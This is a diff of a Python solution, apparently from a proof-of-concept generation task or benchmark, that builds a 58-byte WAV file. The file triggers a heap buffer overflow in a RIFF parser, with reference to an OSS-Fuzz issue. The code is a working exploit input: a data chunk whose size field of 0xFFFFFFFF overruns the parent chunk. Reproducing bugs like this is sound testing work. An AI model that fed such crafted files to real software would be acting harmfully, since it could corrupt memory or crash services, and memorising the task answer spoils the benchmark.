@@ -3,44 +3,41 @@ import struct
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the heap buffer overflow vulnerability in RIFF parsing.
-        The vulnerability occurs when a subchunk's size is not validated against the parent RIFF chunk's size.
+        Generate a PoC that triggers the Heap Buffer Overflow vulnerability.
+        The vulnerability corresponds to oss-fuzz:382816119 where data size 
+        is not properly checked against the end of the RIFF chunk.
+        
+        Structure:
+        1. RIFF Header (12 bytes)
+        2. fmt chunk (24 bytes)
+        3. data chunk (8 bytes header + 14 bytes payload = 22 bytes)
+        Total: 58 bytes
         """
-        # Construct a 58-byte WAV file (RIFF format)
         
-        # 1. RIFF Header
-        # "RIFF" (4 bytes)
-        # ChunkSize (4 bytes): 50 (Total file size 58 - 8 bytes header)
-        # "WAVE" (4 bytes)
-        riff_header = b'RIFF' + struct.pack('<I', 50) + b'WAVE'
+        # RIFF Header
+        # ChunkID: "RIFF"
+        # ChunkSize: 50 (0x32000000) -> Matches total file size of 58 bytes (50 + 8)
+        # Format: "WAVE"
+        riff_header = b'RIFF\x32\x00\x00\x00WAVE'
         
-        # 2. fmt chunk
-        # "fmt " (4 bytes)
-        # Subchunk1Size (4 bytes): 16 for PCM
-        # AudioFormat (2 bytes): 1 (PCM)
-        # NumChannels (2 bytes): 1
-        # SampleRate (4 bytes): 44100
-        # ByteRate (4 bytes): 88200
-        # BlockAlign (2 bytes): 2
-        # BitsPerSample (2 bytes): 16
-        fmt_chunk = b'fmt ' + struct.pack('<I', 16) + \
-                    struct.pack('<H', 1) + \
-                    struct.pack('<H', 1) + \
-                    struct.pack('<I', 44100) + \
-                    struct.pack('<I', 88200) + \
-                    struct.pack('<H', 2) + \
-                    struct.pack('<H', 16)
+        # fmt Chunk
+        # Subchunk1ID: "fmt "
+        # Subchunk1Size: 16 (PCM standard)
+        # AudioFormat: 1 (PCM)
+        # NumChannels: 1
+        # SampleRate: 44100 (0x0000AC44)
+        # ByteRate: 88200 (0x00015888) -> SampleRate * NumChannels * BitsPerSample/8
+        # BlockAlign: 2 -> NumChannels * BitsPerSample/8
+        # BitsPerSample: 16
+        # Packed: <HHIIHH
+        fmt_chunk = b'fmt \x10\x00\x00\x00' + struct.pack('<HHIIHH', 1, 1, 44100, 88200, 2, 16)
         
-        # 3. data chunk (The vulnerable chunk)
-        # "data" (4 bytes)
-        # Subchunk2Size (4 bytes): 0xFF (255). 
-        # This size is significantly larger than the remaining bytes in the RIFF chunk (which is 14 bytes).
-        # A vulnerable parser will read past the end of the allocated buffer based on this size.
-        data_header = b'data' + struct.pack('<I', 255)
+        # data Chunk
+        # Subchunk2ID: "data"
+        # Subchunk2Size: 0xFFFFFFFF -> This large size triggers the vulnerability because 
+        # it exceeds the remaining RIFF chunk size and is not properly checked.
+        # Payload: 14 bytes of padding to reach the ground-truth length of 58 bytes.
+        data_header = b'data\xff\xff\xff\xff'
+        data_payload = b'\x00' * 14
         
-        # 4. Payload
-        # 14 bytes of data to pad the file to exactly 58 bytes
-        # (12 header + 24 fmt + 8 data_header + 14 payload = 58)
-        payload = b'\x00' * 14
-        
-        return riff_header + fmt_chunk + data_header + payload
+        return riff_header + fmt_chunk + data_header + data_payload
